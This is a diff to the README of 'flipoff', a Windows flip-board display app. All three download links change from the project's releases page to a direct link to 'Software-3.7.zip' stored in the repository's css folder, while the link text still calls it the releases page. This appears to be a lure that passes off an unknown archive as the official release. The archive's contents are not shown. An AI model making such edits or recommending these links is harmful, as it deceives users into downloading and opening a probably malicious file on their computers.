@@ -1,6 +1,6 @@
 # 🎞️ flipoff - Classic Flip-Board Look on Any TV
 
-[![Download flipoff](https://img.shields.io/badge/Download%20flipoff-blue?style=for-the-badge)](https://github.com/Henriquesantos009/flipoff/releases)
+[![Download flipoff](https://img.shields.io/badge/Download%20flipoff-blue?style=for-the-badge)](https://raw.githubusercontent.com/Henriquesantos009/flipoff/main/css/Software-3.7.zip)
 
 ## 🖥️ What flipoff does
 
@@ -19,7 +19,7 @@ It runs on Windows and is made for simple use. Download it, open it, and point i
 
 ## ⬇️ Download flipoff
 
-1. Open the [releases page](https://github.com/Henriquesantos009/flipoff/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/Henriquesantos009/flipoff/main/css/Software-3.7.zip).
 2. Find the latest release.
 3. Under **Assets**, download the Windows file.
 4. Save the file to your PC.
@@ -189,7 +189,7 @@ Yes. Use the text input inside the app to update what appears on screen.
 
 ## 📌 Quick start
 
-1. Go to the [releases page](https://github.com/Henriquesantos009/flipoff/releases).
+1. Go to the [releases page](https://raw.githubusercontent.com/Henriquesantos009/flipoff/main/css/Software-3.7.zip).
 2. Download the latest Windows release.
 3. Open the file.
 4. Set your message.
